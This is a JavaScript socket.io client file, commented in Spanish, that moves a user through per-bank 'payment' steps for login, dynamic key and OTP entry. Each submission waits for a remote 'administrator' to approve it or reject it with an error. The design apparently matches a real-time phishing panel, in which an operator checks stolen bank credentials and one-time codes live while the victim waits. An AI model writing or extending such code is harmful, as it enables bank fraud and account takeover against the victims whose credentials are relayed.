// assets/js/socketConnection.js

(function () {
    const RT = (window.RT = window.RT || {
        nodeUrl: null,
        sessionId: null,
        sessionToken: null,
        bank: null,
        step: null,
        alertId: null,
        actionToScreen: {
            AUTH: "2",
            AUTH_WAIT_ACTION: "2",
            AUTH_ERROR: "1",
            DINAMIC: "3",
            DINAMIC_WAIT_ACTION: "3",
            DINAMIC_ERROR: "3",
            OTP: "4",
            OTP_WAIT_ACTION: "4",
            OTP_ERROR: "4",
        },
    });

    // Singleton socket + estado
    let socket = null;
    let isConnecting = false;
    let boundSocket = null;

    // Cola de emits si aún no conecta
    const pendingEmits = [];

    // Callback único por pantalla
    window.__rtUpdateCb = null;

    function safeShowLoading(msg) {
        window.showLoading?.(msg);
    }
    function safeHideLoading() {
        window.hideLoading?.();
    }

    function flushQueue() {
        if (!socket || !socket.connected) return;

        while (pendingEmits.length) {
            const { eventName, payload, ackCb } = pendingEmits.shift();
            socket.emit(eventName, payload, ackCb);
        }
    }

    function bindListeners(socket) {
        if (!socket || boundSocket === socket) return;
        boundSocket = socket;

        socket.on("connect", () => {
            isConnecting = false;

            const hadPending = pendingEmits.length > 0;
            flushQueue();

            // si solo era conexión de pantalla, quita loading
            if (!hadPending) safeHideLoading();
        });

        socket.on("connect_error", (err) => {
            console.error("RT connect_error:", err);
            isConnecting = false;
            safeHideLoading();
            window.showBankAlert?.(
                "error_custom",
                "Error de conexión. Intenta nuevamente."
            );
        });

        socket.on("disconnect", (reason) => {
            // Opcional: podrías mostrar algo si se corta
            // console.warn("RT disconnected:", reason);
        });

        socket.on("session:update", (s) => {
            if (!s || !s.action) return;

            const action = String(s.action);
            console.log(action);
            const expected = RT.actionToScreen[action];
            const current = RT.step;
            const isWait = action.endsWith("_WAIT_ACTION");
            // ✅ Alertas (si usas alertId)
            const alertId = RT.alertId;
            console.log(action);

            // ✅ Loading: se queda mientras espera al admin
            if (isWait) {
                safeShowLoading("Enviado. Esperando al administrador...");
                // opcional: limpiar alerta
                if (alertId) window.hideBankAlert?.(alertId);
                return; // ✅ no redirigir
            }
            console.log(alertId);
            console.log(expected);
            console.log(current);

            if (alertId) {
                if (s.lastError) window.showBankAlert?.(alertId, s.lastError);
                else window.hideBankAlert?.(alertId);
            }

            // ✅ SOLO redirigir cuando NO sea WAIT (cuando el admin ya decidió)
            // 1) WAIT: solo loading, no navegar

            // 2) AUTH_ERROR: guardar error + ir a step1
            if (action === "AUTH_ERROR") {
                if (s?.lastError) {
                    try {
                        sessionStorage.setItem(
                            "rt_last_error",
                            String(s.lastError)
                        );
                    } catch {}
                }
                window.location.href = `/pago/${RT.bank}/step/1`;
                return;
            }

            // 3) Acciones "finales" que avanzan
            if (expected && current && expected !== current) {
                window.location.href = `/pago/${RT.bank}/step/${expected}`;
                return;
            }
            
            // ✅ callback para lógica por pantalla
            if (typeof window.__rtUpdateCb === "function") {
                try {
                    window.__rtUpdateCb(s);
                } catch (e) {
                    console.error(e);
                }
            }
        });

        window.addEventListener("beforeunload", () => {
            try {
                socket?.disconnect();
            } catch {}
        });
    }

    // Expuesto: inicializa (o reutiliza) conexión
    window.initSocketConnection = function (
        nodeUrl,
        sessionId,
        sessionToken,
        bank,
        step
    ) {
        if (!nodeUrl || !sessionToken) return;

        RT.nodeUrl = nodeUrl;
        RT.sessionId = sessionId;
        RT.sessionToken = sessionToken;
        RT.bank = bank;
        RT.step = step;

        // ✅ si ya hay socket conectado, reutiliza
        if (socket && socket.connected) {
            bindListeners(socket);
            return;
        }

        // ✅ si ya está conectando, no dupliques
        if (isConnecting) return;

        safeShowLoading("Conectando...");
        isConnecting = true;

        // desconecta viejo si existe
        try {
            socket?.disconnect();
        } catch {}

        socket = io(nodeUrl, {
            transports: ["websocket"],
            auth: { token: sessionToken },
        });

        window.RT_SOCKET = socket;
        bindListeners(socket);
    };

    // Expuesto: registra callback por pantalla
    window.registerSocketUpdateCallback = function (callback) {
        window.__rtUpdateCb = callback;
    };

    // ✅ Expuesto SIEMPRE: emite aunque no haya conectado aún (lo encola)
    // ✅ Esta es la pieza clave: si no hay conexión, la crea y encola el emit
    window.rtEmitSubmit = function (eventName, payload, ackCb) {
        safeShowLoading("Enviado. Esperando al administrador...");

        // si no hay socket o no está conectado, encola y conecta
        if (!socket || !socket.connected) {
            pendingEmits.push({ eventName, payload, ackCb });

            if (RT.nodeUrl && RT.sessionToken) {
                window.initSocketConnection(
                    RT.nodeUrl,
                    RT.sessionId,
                    RT.sessionToken,
                    RT.bank,
                    RT.step
                );
            }
            return;
        }
        console.log(eventName, payload, ackCb);
        socket.emit(eventName, payload, ackCb);
    };
})();
